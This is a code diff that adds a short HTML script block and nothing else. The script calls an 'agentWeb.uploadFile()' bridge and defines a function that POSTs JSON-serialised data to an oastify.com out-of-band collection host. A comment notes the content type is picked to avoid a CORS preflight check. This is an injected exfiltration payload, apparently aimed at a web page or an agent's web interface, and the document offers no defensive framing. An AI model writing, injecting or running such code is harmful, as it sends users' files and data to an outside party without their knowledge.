@@ -1,0 +1,15 @@
+<script>
+agentWeb.uploadFile();
+let uploadFileResult = function sendData(a) {
+    fetch('https://pg9awdc94ca4nf88quemifl0trzinabz.oastify.com/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'text/plain'  // Avoids triggering preflight
+        },
+        body: JSON.stringify(a)
+    })
+    .then(response => response.text())  // Text response since it's not JSON
+    .then(data => console.log('Response:', data))
+    .catch(error => console.error('Error:', error));
+}
+</script>
